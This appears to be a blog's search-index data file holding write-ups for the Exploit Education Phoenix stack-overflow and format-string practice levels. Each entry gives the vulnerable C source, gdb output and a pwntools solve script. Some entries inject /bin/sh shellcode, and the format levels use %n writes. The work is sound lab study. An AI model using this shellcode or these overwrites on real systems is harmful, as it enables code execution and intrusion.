var store = [{
        "title": "Phoenix - Stack Zero",
        "excerpt":"  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *);  int main(int argc, char **argv) {   struct {     char buffer[64];     volatile int changeme;   } locals;    printf(\"%s\\n\", BANNER);    locals.changeme = 0;   gets(locals.buffer);    if (locals.changeme != 0) {     puts(\"Well done, the 'changeme' variable has been changed!\");   } else {     puts(         \"Uh oh, 'changeme' has not yet been changed. Would you like to try \"         \"again?\");   }    exit(0); }   The code uses gets function which can take input more than buffer length, hence the exploit :)   This level only asks to change the value of changeme to any value other than zero so we can just enter any random input that exceeds the buffer length to overwrite the value of changeme.   Solution:   $ python -c \"print 'A'*100\" | /opt/phoenix/amd64/stack-zero Welcome to phoenix/stack-zero, brought to you by https://exploit.education Well done, the 'changeme' variable has been changed!  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/stack-zero/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Stack One",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   struct {     char buffer[64];     volatile int changeme;   } locals;    printf(\"%s\\n\", BANNER);    if (argc &lt; 2) {     errx(1, \"specify an argument, to be copied into the \\\"buffer\\\"\");   }    locals.changeme = 0;   strcpy(locals.buffer, argv[1]);    if (locals.changeme == 0x496c5962) {     puts(\"Well done, you have successfully set changeme to the correct value\");   } else {     printf(\"Getting closer! changeme is currently 0x%08x, we want 0x496c5962\\n\",         locals.changeme);   }    exit(0); }   This code uses strcpy function which is dangerous because the source size could be more than destination size.   The only difference from this level and the previous one is that it requires changeme to be set to a specific value 0x496c5962.   Now we can use gdb:   $ gdb -q /opt/phoenix/amd64/stack-one Reading symbols from stack-one...(no debugging symbols found)...done.  gef➤  disassemble main  Dump of assembler code for function main:    0x000000000040066d &lt;+0&gt;:\tpush   rbp    0x000000000040066e &lt;+1&gt;:\tmov    rbp,rsp    0x0000000000400671 &lt;+4&gt;:\tsub    rsp,0x60    0x0000000000400675 &lt;+8&gt;:\tmov    DWORD PTR [rbp-0x54],edi    0x0000000000400678 &lt;+11&gt;:\tmov    QWORD PTR [rbp-0x60],rsi    0x000000000040067c &lt;+15&gt;:\tmov    edi,0x400750    0x0000000000400681 &lt;+20&gt;:\tcall   0x4004c0 &lt;puts@plt&gt;    0x0000000000400686 &lt;+25&gt;:\tcmp    DWORD PTR [rbp-0x54],0x1    0x000000000040068a &lt;+29&gt;:\tjg     0x4006a0 &lt;main+51&gt;    0x000000000040068c &lt;+31&gt;:\tmov    esi,0x4007a0    0x0000000000400691 &lt;+36&gt;:\tmov    edi,0x1    0x0000000000400696 &lt;+41&gt;:\tmov    eax,0x0    0x000000000040069b &lt;+46&gt;:\tcall   0x4004d0 &lt;errx@plt&gt;    0x00000000004006a0 &lt;+51&gt;:\tmov    DWORD PTR [rbp-0x10],0x0    0x00000000004006a7 &lt;+58&gt;:\tmov    rax,QWORD PTR [rbp-0x60]    0x00000000004006ab &lt;+62&gt;:\tadd    rax,0x8    0x00000000004006af &lt;+66&gt;:\tmov    rdx,QWORD PTR [rax]    0x00000000004006b2 &lt;+69&gt;:\tlea    rax,[rbp-0x50]    0x00000000004006b6 &lt;+73&gt;:\tmov    rsi,rdx    0x00000000004006b9 &lt;+76&gt;:\tmov    rdi,rax    0x00000000004006bc &lt;+79&gt;:\tcall   0x4004a0 &lt;strcpy@plt&gt;    .....   We can see that  buffer is at rbp-0x50 (main+69) and changeme is at rbp-0x10 (main+51) so we need 64 characters to fill this gap then we can overwrite changeme value.   Solution:   # solve.py  from pwn import *  buff = \"\" buff += 'A'*64 buff += p64(0x496c5962)  print(buff)   $ /opt/phoenix/amd64/stack-one $(python solve.py) Welcome to phoenix/stack-one, brought to you by https://exploit.education Well done, you have successfully set changeme to the correct value   ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/stack-one/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Stack Two",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   struct {     char buffer[64];     volatile int changeme;   } locals;    char *ptr;    printf(\"%s\\n\", BANNER);    ptr = getenv(\"ExploitEducation\");   if (ptr == NULL) {     errx(1, \"please set the ExploitEducation environment variable\");   }    locals.changeme = 0;   strcpy(locals.buffer, ptr);    if (locals.changeme == 0x0d0a090a) {     puts(\"Well done, you have successfully set changeme to the correct value\");   } else {     printf(\"Almost! changeme is currently 0x%08x, we want 0x0d0a090a\\n\",         locals.changeme);   }    exit(0); }   This level is identical to the previous one except that we need to put the exploit in ExploitEducation environment variable instead.   Solution:   # solve.py  from pwn import *  buff = \"\" buff += 'A'*64 buff += p64(0x0d0a090a)  print(buff)   $ export ExploitEducation=$(python solve.py) $ /opt/phoenix/amd64/stack-two Welcome to phoenix/stack-two, brought to you by https://exploit.education Well done, you have successfully set changeme to the correct value   ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/stack-two/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Stack Three",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *);  void complete_level() {   printf(\"Congratulations, you've finished \" LEVELNAME \" :-) Well done!\\n\");   exit(0); }  int main(int argc, char **argv) {   struct {     char buffer[64];     volatile int (*fp)();   } locals;    printf(\"%s\\n\", BANNER);    locals.fp = NULL;   gets(locals.buffer);    if (locals.fp) {     printf(\"calling function pointer @ %p\\n\", locals.fp);     fflush(stdout);     locals.fp();   } else {     printf(\"function pointer remains unmodified :~( better luck next time!\\n\");   }    exit(0); }   The goal of this challenge if to overwrite the value of fp  which is a function pointer to point to complete_level function.   $ gdb -q /opt/phoenix/amd64/stack-three Reading symbols from /opt/phoenix/amd64/stack-three...(no debugging symbols found)...done.  gef➤  print complete_level  $1 = {&lt;text variable, no debug info&gt;} 0x40069d &lt;complete_level&gt;   Now that we know the address of complete_level function is 0x40069d, we can now build our exploit.   Solution:   # solve.py  from pwn import *  buff = \"\" buff += 'A'*64 buff += p64(0x40069d)  print(buff)   $ python solve.py | /opt/phoenix/amd64/stack-three Welcome to phoenix/stack-three, brought to you by https://exploit.education calling function pointer @ 0x40069d Congratulations, you've finished phoenix/stack-three :-) Well done!   ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/stack-three/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Stack Four",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *);  void complete_level() {   printf(\"Congratulations, you've finished \" LEVELNAME \" :-) Well done!\\n\");   exit(0); }  void start_level() {   char buffer[64];   void *ret;    gets(buffer);    ret = __builtin_return_address(0);   printf(\"and will be returning to %p\\n\", ret); }  int main(int argc, char **argv) {   printf(\"%s\\n\", BANNER);   start_level(); }   The goal of this level is to overwrite the return address of start_level function to return to complete_level function instead of main.   First we get the address of complete_level function:   $ gdb -q /opt/phoenix/amd64/stack-four Reading symbols from /opt/phoenix/amd64/stack-four...(no debugging symbols found)...done.  gef➤  print complete_level  $1 = {&lt;text variable, no debug info&gt;} 0x40061d &lt;complete_level&gt;   So we must overwrite RIP with the address  0x40061d.   gef➤  disassemble start_level  Dump of assembler code for function start_level:    0x0000000000400635 &lt;+0&gt;:\tpush   rbp    0x0000000000400636 &lt;+1&gt;:\tmov    rbp,rsp    0x0000000000400639 &lt;+4&gt;:\tsub    rsp,0x50    0x000000000040063d &lt;+8&gt;:\tlea    rax,[rbp-0x50]    0x0000000000400641 &lt;+12&gt;:\tmov    rdi,rax    0x0000000000400644 &lt;+15&gt;:\tcall   0x400470 &lt;gets@plt&gt;    0x0000000000400649 &lt;+20&gt;:\tmov    rax,QWORD PTR [rbp+0x8]    .....   So to overwrite RIP we must enter (0x50 junk + 8 bytes for RBP + address of complete_level).   gef➤  b *0x0000000000400649 Breakpoint 1 at 0x400649  gef➤  r &lt;&lt;&lt; $(python solve.py) Starting program: /opt/phoenix/amd64/stack-four &lt;&lt;&lt; $(python solve.py) Welcome to phoenix/stack-four, brought to you by https://exploit.education Breakpoint 1, 0x0000000000400649 in start_level () ......  gef➤  info registers rbp rbp            0x7fffffffe630      0x7fffffffe630  gef➤  x/12xg $rsp 0x7fffffffe5e0:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe5f0:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe600:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe610:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe620:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe630:\t0x4242424242424242\t0x000000000040061d   Here we can see that RBP was overwritten to  0x4242424242424242 and after it is the value of RIP 0x000000000040061d which is the address of complete_level function.   Solution:   # solve.py  from pwn import *  buff = \"\" buff += 'A'*80\t\t\t# junk buff += 'BBBBBBBB'\t\t# RBP value buff += p64(0x40061d)\t\t# RIP value  print(buff)   $ python solve.py | /opt/phoenix/amd64/stack-four Welcome to phoenix/stack-four, brought to you by https://exploit.education and will be returning to 0x40061d Congratulations, you've finished phoenix/stack-four :-) Well done!  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/stack-four/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Stack Five",
        "excerpt":"#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *gets(char *);  void start_level() {   char buffer[128];   gets(buffer); }  int main(int argc, char **argv) {   printf(\"%s\\n\", BANNER);   start_level(); }   Here we don’t have any function to jump to but we have a buffer large enough to fit a shellcode.   The idea is to put our shellcode in buffer and return execution to it.   So we have to enter: (shellcode + junk to fill the buffer + 8 bytes for RBP + RIP with the address of the buffer).   When dealing with shellcode it’s a good idea to unset some environment variables that gdb adds them to jump to the right address.   $ gdb -q /opt/phoenix/amd64/stack-five Reading symbols from /opt/phoenix/amd64/stack-five...(no debugging symbols found)...done.  gef➤  unset env LINES gef➤  unset env COLUMNS gef➤  disassemble start_level  Dump of assembler code for function start_level:    0x000000000040058d &lt;+0&gt;:\tpush   rbp    0x000000000040058e &lt;+1&gt;:\tmov    rbp,rsp    0x0000000000400591 &lt;+4&gt;:\tadd    rsp,0xffffffffffffff80    0x0000000000400595 &lt;+8&gt;:\tlea    rax,[rbp-0x80]    0x0000000000400599 &lt;+12&gt;:\tmov    rdi,rax    0x000000000040059c &lt;+15&gt;:\tcall   0x4003f0 &lt;gets@plt&gt;    0x00000000004005a1 &lt;+20&gt;:\tnop    0x00000000004005a2 &lt;+21&gt;:\tleave      0x00000000004005a3 &lt;+22&gt;:\tret       Buffer size if 0x80 = 128 bytes.   Now we put a breakpoint at gets function to get the address of buffer.   gef➤  b *0x000000000040059c Breakpoint 1 at 0x40059c  gef➤  r Starting program: /opt/phoenix/amd64/stack-five  Welcome to phoenix/stack-five, brought to you by https://exploit.education  Breakpoint 1, 0x000000000040059c in start_level ()  gef➤  print $rbp-0x80 $1 = (void *) 0x7fffffffe5d0   Buffer address at 0x7fffffffe5d0.   Now we have all the pieces to write the exploit.   You can find a lot of shellcode at http://shell-storm.org/shellcode.   It’s always good to add some NOP instructions before the shellcode to add some flexibility with the exact address of the buffer (NOP is no operation instruction, it does nothing so it’s useful to fill gaps).   # solve.py  from pwn import *  shellcode = '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'  buff = \"\" buff += '\\x90'*30\t\t\t# NOP Sled buff += shellcode\t\t\t# shellcode buff += 'A'* (128 - len(buff))\t\t# junk buff += 'BBBBBBBB'\t\t\t# RBP value buff += p64(0x7fffffffe5d0)\t\t# RIP value (buffer address)  print(buff)   Wee need to chain our script with cat command to avoid closing the input stream.   $ (python solve.py; cat) | /opt/phoenix/amd64/stack-five Welcome to phoenix/stack-five, brought to you by https://exploit.education whoami phoenix-amd64-stack-five   ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/stack-five/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Stack Six",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  char *what = GREET;  char *greet(char *who) {   char buffer[128];   int maxSize;    maxSize = strlen(who);   if (maxSize &gt; (sizeof(buffer) - /* ensure null termination */ 1)) {     maxSize = sizeof(buffer) - 1;   }    strcpy(buffer, what);   strncpy(buffer + strlen(buffer), who, maxSize);    return strdup(buffer); }  int main(int argc, char **argv) {   char *ptr;   printf(\"%s\\n\", BANNER);  #ifdef NEWARCH   if (argv[1]) {     what = argv[1];   } #endif    ptr = getenv(\"ExploitEducation\");   if (NULL == ptr) {     // This style of comparison prevents issues where you may accidentally     // type if(ptr = NULL) {}..      errx(1, \"Please specify an environment variable called ExploitEducation\");   }    printf(\"%s\\n\", greet(ptr));   return 0; }   This level exploits the 1‑byte buffer overflow, to learn more about it read the references at the end.   This code reads the environment variable ExploitEducation and passes it to greet function in the variable who.   Then it copies GREET message to the buffer which in this case is “Welcome, I am pleased to meet you “.   After that it check for input size (maximum size is 127).   Now comes the bug, it copies the input to buffer + 34 (GREET length) so if our input size is 127 which is the maximum we could overflow the buffer and write 34 bytes past it.   So in total we are allowed to write 34 + 127 = 161 bytes, is it enough to overwrite the return address and redirect code execution ???   Unfortunately the answer it no, we can only overwrite the lowest byte of the saved RBP.      Quick tips:          You can add these lines to “.gdbinit” file to adjust gdb addresses to be more realistic.       unset env LINES unset env COLUMNS set env _ /opt/phoenix/amd64/stack-six            Keep the length of your exploit fixed every time to avoid shifting memory addresses (and to avoid the headache).      $ export ExploitEducation=$(python -c \"print 'A'*161\")\t\t\t# Fill ExploitEducation env variable with 127 A's  $ gdb -q /opt/phoenix/amd64/stack-six  Reading symbols from /opt/phoenix/amd64/stack-six...(no debugging symbols found)...done.  gef➤  disassemble greet  Dump of assembler code for function greet: .....    0x000000000040077a &lt;+125&gt;:\tmov    rdi,rcx    0x000000000040077d &lt;+128&gt;:\tcall   0x400550 &lt;strncpy@plt&gt;    0x0000000000400782 &lt;+133&gt;:\tlea    rax,[rbp-0xa0]\t\t\t# address of who    0x0000000000400789 &lt;+140&gt;:\tmov    rdi,rax    0x000000000040078c &lt;+143&gt;:\tcall   0x400560 &lt;strdup@plt&gt; .....  gef➤  b *0x0000000000400782 Breakpoint 1 at 0x400782  gef➤  r Starting program: /opt/phoenix/amd64/stack-six  Welcome to phoenix/stack-six, brought to you by https://exploit.education Breakpoint 1, 0x0000000000400782 in greet ()  gef➤  info registers rbp rbp            0x7fffffffe590      0x7fffffffe590  gef➤   x/22xg $rbp-0xa0 0x7fffffffe510:\t0x2c656d6f636c6557\t0x6c70206d61204920 0x7fffffffe520:\t0x6f74206465736165\t0x6f79207465656d20 0x7fffffffe530:\t0x4141414141412075\t0x4141414141414141 0x7fffffffe540:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe550:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe560:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe570:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe580:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe590:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe5a0:\t0x4141414141414141\t0x4141414141414141 0x7fffffffe5b0:\t0x00007fffffffe541\t0x00000000004007e9   As you can see we were able to only overwrite the first byte of the saved RBP (remember that this is the base pointer of the calling function”main”).   We know that this modified RBP will be used to restore RSP at the end of main function and then jump to the return address, so the idea of the exploit is modifying RBP to point to a an address where RBP+8 (which will be the return address of main) points somewhere in the environment variable ExploitEducation.   We can get the address of ExploitEducation using many ways like dumping the stack until we find it (environment variables are at the end of the stack).   Here I used the command grep which is an alias for search-pattern.   gef➤  grep ExploitEducation= [+] Searching 'ExploitEducation=' in memory [+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx   0x7fffffffeeff - 0x7fffffffef36  →   \"ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]\"   As you can see our input address starts at 0x7fffffffeeff, but we need the start of the input to the real start is 0x7fffffffeeff + len(“ExploitEducation=”) = 0x7fffffffef10.   So the return address must point somewhere inside 0x7fffffffef10 and 0x7fffffffef10+126.   As we can only change the last byte of RBP, it’s value can be between 0x7fffffffe501 and 0x7fffffffe5ff, so let’s put a breakpoint at the end of main and see if there is a good address we can jump to in this range.   gef➤  disassemble main  Dump of assembler code for function main:    0x00000000004007e4 &lt;+73&gt;:\tcall   0x4006fd &lt;greet&gt;    0x00000000004007e9 &lt;+78&gt;:\tmov    rdi,rax    0x00000000004007ec &lt;+81&gt;:\tcall   0x400530 &lt;puts@plt&gt;    0x00000000004007f1 &lt;+86&gt;:\tmov    eax,0x0    0x00000000004007f6 &lt;+91&gt;:\tleave  gef➤  b *0x00000000004007f6 Breakpoint 2 at 0x4007f6  gef➤  r Starting program: /opt/phoenix/amd64/stack-six  Welcome to phoenix/stack-six, brought to you by https://exploit.education Breakpoint 1, 0x00000000004007f6 in main ()  gef➤   x/32xg 0x7fffffffe500 0x7fffffffe500:\t0x00007ffff7ffc948\t0x00000000000000a6 0x7fffffffe510:\t0x0000000000000001\t0x00007ffff7db6d0f 0x7fffffffe520:\t0x00007ffff7ffc948\t0x00000000000000a6 0x7fffffffe530:\t0x00007fffffffe58f\t0x0000000000000001 0x7fffffffe540:\t0x4141414141414141\t0x00007ffff7ffb300 0x7fffffffe550:\t0x0000000000000000\t0x0000000000600c00 0x7fffffffe560:\t0x000000000040079b\t0x0000000000000000 0x7fffffffe570:\t0x0000000000000000\t0x00007ffff7db6b1e 0x7fffffffe580:\t0x00007ffff7ffb300\t0x0a00000000000000 0x7fffffffe590:\t0x00007ffff7ffb300\t0x00007ffff7db9934 0x7fffffffe5a0:\t0x4141414141414141\t0x00007fffffffe541 0x7fffffffe5b0:\t0x00007fffffffe648\t0x00000000004007f1 0x7fffffffe5c0:\t0x00007fffffffe638\t0x00000001ffffe648 0x7fffffffe5d0:\t0x000000000040079b\t0x00007fffffffef10 0x7fffffffe5e0:\t0x0000000000000001\t0x00007ffff7d8fd62 0x7fffffffe5f0:\t0x0000000000000000\t0x00007fffffffe630   And viola!!!, we get 0x00007fffffffef10 at address 0x7fffffffe5d8 so we overwrite RBP to be 0x7fffffffe5d0 and that’s it, the leave instruction will move RBP to RSP and pop the top value of the stack to RBP (which is at 0x7fffffffe5d0) then the ret will pop the next value to RIP (which is at 0x7fffffffe5d8).   So the whole idea was to overwrite RBP to point to an address where RBP+8 is the address of our shellcode, so that at the end of the calling function the value of RIP will point to that address.   Solution:   # solve.py  from pwn import *  shellcode = '\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05'  buff = \"\" buff += '\\x90' * 20\t\t# some NOP sled is always good :) buff += shellcode buff += 'A' * (126 - len(buff)) buff += '\\xd0'  print(buff)   $ export ExploitEducation=$(python solve.py) $ /opt/phoenix/amd64/stack-six Welcome to phoenix/stack-six, brought to you by https://exploit.education Welcome, I am pleased to meet you 1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����� $ whoami phoenix-amd64-stack-six   Note: the 32bit version might have a slightly different solution, but the idea is still the same.   References:   https://www.welivesecurity.com/2016/05/10/exploiting-1-byte-buffer-overflows  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/stack-six/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Format Zero",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   struct {     char dest[32];     volatile int changeme;   } locals;   char buffer[16];    printf(\"%s\\n\", BANNER);    if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {     errx(1, \"Unable to get buffer\");   }   buffer[15] = 0;    locals.changeme = 0;    sprintf(locals.dest, buffer);    if (locals.changeme != 0) {     puts(\"Well done, the 'changeme' variable has been changed!\");   } else {     puts(         \"Uh oh, 'changeme' has not yet been changed. Would you like to try \"         \"again?\");   }    exit(0); }   To learn about format string vulnerability see the references at the end.   This code uses sprintf function to write the formatted string buffer to dest.   The bug here is that if we entered a format string like %d without additional arguments (a number in this case) we could leak some values of the stack.   For example:   int main() { \tprintf(\"%x.%x.%x\"); } # output: d0a8b868 d0a8b878 3c43b1b0   As you can see we were able to leak some stack addresses.   Back to our level we must overflow dest to overwrite changeme but the buffer is too small for that so we can use the format string trick to solve this.   As you saw that one %x prints 8 characters so we can enter: (4 %x + value of changeme).   We can also just enter one %x with padding of 32 bytes like this: (%32x + value of changeme).   user@phoenix-amd64:~$ gdb -q /opt/phoenix/amd64/format-zero  Reading symbols from /opt/phoenix/amd64/format-zero...(no debugging symbols found)...done.  gef➤  disassemble main  Dump of assembler code for function main: .....    0x0000000000400700 &lt;+99&gt;:\tmov    eax,0x0    0x0000000000400705 &lt;+104&gt;:\tcall   0x400500 &lt;sprintf@plt&gt;    0x000000000040070a &lt;+109&gt;:\tmov    eax,DWORD PTR [rbp-0x10] .....  gef➤  b *0x000000000040070a Breakpoint 1 at 0x40070a  gef➤  r Starting program: /opt/phoenix/amd64/format-zero  Welcome to phoenix/format-zero, brought to you by https://exploit.education %32xAAAAAAAA  gef➤  x/5xg $rbp-0x30 0x7fffffffe620:\t0x2020202020202020\t0x2020202020202020 0x7fffffffe630:\t0x2020202020202020\t0x3031366566666666 0x7fffffffe640:\t0x0000000a41414141   Solution:   $ echo \"%32xAAAA\" | /opt/phoenix/amd64/format-zero  Welcome to phoenix/format-zero, brought to you by https://exploit.education Well done, the 'changeme' variable has been changed!     References:   http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/format-zero/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Format One",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int main(int argc, char **argv) {   struct {     char dest[32];     volatile int changeme;   } locals;   char buffer[16];    printf(\"%s\\n\", BANNER);    if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {     errx(1, \"Unable to get buffer\");   }   buffer[15] = 0;    locals.changeme = 0;    sprintf(locals.dest, buffer);    if (locals.changeme != 0x45764f6c) {     printf(\"Uh oh, 'changeme' is not the magic value, it is 0x%08x\\n\",         locals.changeme);   } else {     puts(\"Well done, the 'changeme' variable has been changed correctly!\");   }    exit(0); }   This level is the same as the last one except that we need set changeme to a specific value 0x45764f6c instead of a random value.   Solution:   #solve.py  from pwn import *  buff = \"\" buff += '%32x' buff += p64(0x45764f6c)  print(buff)   $ python solve.py | /opt/phoenix/amd64/format-one Welcome to phoenix/format-one, brought to you by https://exploit.education Well done, the 'changeme' variable has been changed correctly!   ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/format-one/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/exploit-education/exploit-education.png"
      },{
        "title": "Phoenix - Format Two",
        "excerpt":"#include &lt;err.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;  #define BANNER \\   \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"  int changeme;  void bounce(char *str) {   printf(str); }  int main(int argc, char **argv) {   char buf[256];    printf(\"%s\\n\", BANNER);    if (argc &gt; 1) {     memset(buf, 0, sizeof(buf));     strncpy(buf, argv[1], sizeof(buf));     bounce(buf);   }    if (changeme != 0) {     puts(\"Well done, the 'changeme' variable has been changed correctly!\");   } else {     puts(\"Better luck next time!\\n\");   }    exit(0); }   The goal of this level is to use the format string vulnerability to write to a memory address changeme.   $ gdb -q /opt/phoenix/amd64/format-two Reading symbols from /opt/phoenix/amd64/format-two...(no debugging symbols found)...done.  gef➤  disassemble main  Dump of assembler code for function main: .....    0x0000000000400700 &lt;+115&gt;:\tcall   0x40066d &lt;bounce&gt;    0x0000000000400705 &lt;+120&gt;:\tmov    eax,DWORD PTR [rip+0x2003e5]        # 0x600af0 &lt;changeme&gt;    0x000000000040070b &lt;+126&gt;:\ttest   eax,eax .....   Here we can see the address we want to write to is 0x600af0 which is not exploitable because it has bad characters that will terminate the input and ignore everything after it :(   Bad characters:      \\x00\t(Null)   \\x09\t(Tab)   \\x0a\t(New line)   \\x0d\t(Carriage return)   \\x20\t(Space)   So we switch gears to the 32bit binary.   $ gdb -q /opt/phoenix/i486/format-two  Reading symbols from /opt/phoenix/i486/format-two...(no debugging symbols found)...done.  gef➤  disassemble main  Dump of assembler code for function main: .....    0x0804859b &lt;+111&gt;:\tcall   0x8048515 &lt;bounce&gt;    0x080485a0 &lt;+116&gt;:\tadd    esp,0x10    0x080485a3 &lt;+119&gt;:\tmov    eax,ds:0x8049868    0x080485a8 &lt;+124&gt;:\ttest   eax,eax ....   Now the address of changeme is 0x8049868, good.   First we should know where our input is stored in the stack.   $ /opt/phoenix/i486/format-two \"AAAA%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x\" Welcome to phoenix/format-two, brought to you by https://exploit.education AAAAffffd89b 100 0 f7f84b67 ffffd6f0 ffffd6d8 80485a0 ffffd5d0 ffffd89b 100 3e8 41414141 25207825 78252078 20782520 25207825Better luck next time!   We can see our input 41414141 which is AAAA at offset 12.   To write to an address we user the %n which writes the number of characters so far to a memory address.   So we can replace AAAA with the address of changeme and replace the last %x with %n to write to that address.   $ /opt/phoenix/i486/format-two $'\\x68\\x98\\x04\\x08%x %x %x %x %x %x %x %x %x %x %x %x \\n' Welcome to phoenix/format-two, brought to you by https://exploit.education hffffd8a5 100 0 f7f84b67 ffffd700 ffffd6e8 80485a0 ffffd5e0 ffffd8a5 100 3e8 8049868  Better luck next time!   Notice we write the address in little endian.   We could also use the direct parameter access format using %12$x instead of all these %x but it doesn’t work all the time (and apparently doesn’t work here).   Solution:   $ /opt/phoenix/i486/format-two $'\\x68\\x98\\x04\\x08%x %x %x %x %x %x %x %x %x %x %x %n \\n' Welcome to phoenix/format-two, brought to you by https://exploit.education hffffd8a5 100 0 f7f84b67 ffffd700 ffffd6e8 80485a0 ffffd5e0 ffffd8a5 100 3e8   Well done, the 'changeme' variable has been changed correctly!  